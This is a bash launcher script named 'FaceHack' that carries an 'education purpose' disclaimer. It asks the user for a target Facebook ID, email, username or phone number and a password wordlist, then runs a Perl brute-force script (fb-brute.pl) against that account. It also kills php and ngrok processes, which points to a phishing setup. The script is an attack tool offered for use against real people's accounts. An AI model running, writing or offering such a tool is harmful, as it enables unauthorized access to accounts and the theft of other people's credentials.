#!/bin/bash
clear
echo ""
echo ""
echo ""
 echo -e $'\e[1;33m\e[0m' 
printf "\e[1;31m𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 \e[1;32m FaceHack (𝗥𝗲𝗺𝗲𝗺𝗯𝗲𝗿 𝗢𝗻𝗹𝘆 𝗙𝗼𝗿 𝗘𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻 𝗣𝘂𝗿𝗽𝗼𝘀𝗲 )\e[0m"
echo""
 echo -e $'\e[1;33m\e[0m' 
sleep 6
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32m 𝐎𝐧𝐥𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐏𝐮𝐫𝐩𝐨𝐬𝐞\e[1;33m     (𝙔/𝙉) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
chmod 777 Logo.sh
./Logo.sh

echo ""
echo ""
                 echo -e $'\e[1;31m--------------------------------------------\e[0m' 
                 echo -e $'\e[1;32m          𝗧𝘆𝗽𝗲 𝐅 𝗧𝗼 𝗦𝘁𝗮𝗿𝘁 𝐀𝐭𝐭𝐚𝐜𝐤 \e[0m' 
                 echo -e $'\e[1;31m--------------------------------------------\e[0m' 

                 echo ""
                 echo""
                 read -p "Type [F] To Attack ------>> " ch
if [ $ch = F ]; then
echo -e "$green"
read -p "Set Target Facebook ID or Email or Username or Number: " id
read -p "Set Password list path : " wordlist
echo -e "$nc"
cd facebook
perl fb-brute.pl $id $wordlist
echo -e " 		[+]$yellow Done  $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Do You Want To Attack Again [ Y / n ] : " check
echo -e "$nc"
elif [ $ch == E ]; then
echo -e "$red Program Exit ...$nc"
sleep 0.25
exit 1
else
echo "Attack Not Successful (Try Again) , Exit"
exit 1
fi
